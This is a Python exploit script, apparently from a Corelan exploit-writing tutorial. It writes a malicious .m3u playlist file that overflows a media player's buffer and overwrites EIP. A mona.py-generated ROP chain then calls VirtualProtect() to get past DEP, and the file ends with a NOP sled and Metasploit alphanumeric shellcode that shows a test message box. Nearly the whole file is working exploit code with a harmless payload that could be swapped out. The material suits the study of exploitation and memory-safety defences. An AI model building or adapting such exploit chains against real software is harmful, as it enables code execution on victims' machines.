import struct

##Register setup for VirtualProtect() :
##--------------------------------------------
## EAX = NOP (0x90909090)
## ECX = lpOldProtect (ptr to W address)
## EDX = NewProtect (0x40)
## EBX = dwSize
## ESP = lPAddress (automatic)
## EBP = ReturnTo (ptr to jmp esp)
## ESI = ptr to VirtualProtect()
## EDI = ROP NOP (RETN)

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x7c80997d,  # POP EAX # RETN [kernel32.dll] 
      0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
      0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
      0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x1002a735,  # POP EBP # RETN [MSRMfilter03.dll] 
      0x77c354b4,  # & push esp # ret  [msvcrt.dll]
      0x77c21d16,  # POP EAX # RETN [msvcrt.dll] 
      #0xa28001c1,  # put delta into eax (-> put 0x00000201 into ebx)
      #0xa280027c,  # put delta into eax (-> put 0x000002BC into ebx) - sc
      0xa2800344,  # put delta into eax (-> put 0x00000384 into ebx) - sc + nops
      0x7c87fa01,  # ADD EAX,5D800040 # RETN 0x04 [kernel32.dll] 
      0x1001bdee,  # PUSH EAX # MOV EAX,1 # POP EBX # ADD ESP,8 # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x10025b72,  # POP EAX # RETN [MSRMfilter03.dll] 
      #0xa4a2a11c,  # put delta into eax (-> put 0xffffff2c into edx)
      0xa4a2a230,  # put delta into eax (-> put 0x00000040 into edx)
      0x10030614,  # ADD EAX,5B5D5E10 # ADD ESP,114 # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      0x77c42ebc,  # POP ECX # RETN [msvcrt.dll] 
      0x7c885914,  # &Writable location [kernel32.dll]
      0x100282db,  # POP EDI # RETN [MSRMfilter03.dll] 
      0x10012e04,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1002a21d,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x90909090,  # nop
      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    ]
    
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

buffersize = 25000+1067
junk = "Z" * buffersize
eip = struct.pack('<I',0x100102dc)  # RETN into stack
junk2 = "AAAA" #compensate
rop_chain = create_rop_chain()

# ./msfpayload windows/messagebox
#  TITLE=CORELAN TEXT="rop test by corelanc0d3r" R
shellcode = ("\x89\xe0\xda\xcf\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a" +
"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59" +
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" +
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" +
"\x75\x4a\x49\x48\x59\x48\x6b\x4f\x6b\x48\x59\x43\x44\x51" +
"\x34\x4c\x34\x50\x31\x48\x52\x4f\x42\x42\x5a\x46\x51\x49" +
"\x59\x45\x34\x4e\x6b\x51\x61\x44\x70\x4e\x6b\x43\x46\x46" +
"\x6c\x4c\x4b\x42\x56\x45\x4c\x4c\x4b\x42\x66\x43\x38\x4c" +
"\x4b\x51\x6e\x45\x70\x4e\x6b\x50\x36\x44\x78\x42\x6f\x45" +
"\x48\x44\x35\x4c\x33\x50\x59\x43\x31\x4a\x71\x4b\x4f\x48" +
"\x61\x43\x50\x4c\x4b\x50\x6c\x51\x34\x46\x44\x4e\x6b\x47" +
"\x35\x45\x6c\x4c\x4b\x42\x74\x43\x35\x42\x58\x46\x61\x48" +
"\x6a\x4e\x6b\x51\x5a\x45\x48\x4e\x6b\x42\x7a\x47\x50\x47" +
"\x71\x48\x6b\x4a\x43\x45\x67\x42\x69\x4e\x6b\x47\x44\x4e" +
"\x6b\x46\x61\x48\x6e\x46\x51\x49\x6f\x45\x61\x49\x50\x49" +
"\x6c\x4e\x4c\x4d\x54\x49\x50\x50\x74\x45\x5a\x4b\x71\x48" +
"\x4f\x44\x4d\x47\x71\x4b\x77\x48\x69\x48\x71\x49\x6f\x49" +
"\x6f\x4b\x4f\x45\x6b\x43\x4c\x47\x54\x44\x68\x51\x65\x49" +
"\x4e\x4e\x6b\x50\x5a\x45\x74\x46\x61\x48\x6b\x50\x66\x4e" +
"\x6b\x46\x6c\x50\x4b\x4c\x4b\x51\x4a\x45\x4c\x45\x51\x4a" +
"\x4b\x4e\x6b\x43\x34\x4c\x4b\x43\x31\x4a\x48\x4d\x59\x42" +
"\x64\x51\x34\x47\x6c\x45\x31\x4f\x33\x4f\x42\x47\x78\x44" +
"\x69\x49\x44\x4f\x79\x4a\x45\x4e\x69\x4a\x62\x43\x58\x4e" +
"\x6e\x42\x6e\x44\x4e\x48\x6c\x43\x62\x4a\x48\x4d\x4c\x4b" +
"\x4f\x4b\x4f\x49\x6f\x4d\x59\x42\x65\x43\x34\x4f\x4b\x51" +
"\x6e\x48\x58\x48\x62\x43\x43\x4e\x67\x47\x6c\x45\x74\x43" +
"\x62\x49\x78\x4e\x6b\x4b\x4f\x4b\x4f\x49\x6f\x4f\x79\x50" +
"\x45\x45\x58\x42\x48\x50\x6c\x42\x4c\x51\x30\x4b\x4f\x51" +
"\x78\x50\x33\x44\x72\x44\x6e\x51\x74\x50\x68\x42\x55\x50" +
"\x73\x42\x45\x42\x52\x4f\x78\x43\x6c\x47\x54\x44\x4a\x4c" +
"\x49\x4d\x36\x50\x56\x4b\x4f\x43\x65\x47\x74\x4c\x49\x48" +
"\x42\x42\x70\x4f\x4b\x49\x38\x4c\x62\x50\x4d\x4d\x6c\x4e" +
"\x67\x45\x4c\x44\x64\x51\x42\x49\x78\x51\x4e\x49\x6f\x4b" +
"\x4f\x49\x6f\x42\x48\x42\x6c\x43\x71\x42\x6e\x50\x58\x50" +
"\x68\x47\x33\x42\x6f\x50\x52\x43\x75\x45\x61\x4b\x6b\x4e" +
"\x68\x51\x4c\x47\x54\x47\x77\x4d\x59\x4b\x53\x50\x68\x51" +
"\x48\x47\x50\x51\x30\x51\x30\x42\x48\x50\x30\x51\x74\x50" +
"\x33\x50\x72\x45\x38\x42\x4c\x45\x31\x50\x6e\x51\x73\x43" +
"\x58\x50\x63\x50\x6f\x43\x42\x50\x65\x42\x48\x47\x50\x43" +
"\x52\x43\x49\x51\x30\x51\x78\x43\x44\x42\x45\x51\x63\x50" +
"\x74\x45\x38\x44\x32\x50\x6f\x42\x50\x51\x30\x46\x51\x48" +
"\x49\x4c\x48\x42\x6c\x47\x54\x44\x58\x4d\x59\x4b\x51\x46" +
"\x51\x48\x52\x51\x42\x46\x33\x50\x51\x43\x62\x49\x6f\x4e" +
"\x30\x44\x71\x49\x50\x50\x50\x4b\x4f\x50\x55\x45\x58\x45" +
"\x5a\x41\x41")
print(len(shellcode)) #619
nops = "\x90" * 200
rest = "C" * 300
payload = junk+eip+junk2+rop_chain+nops+shellcode+rest

with open("vprotect.m3u", 'w') as f:
    f.write(payload)
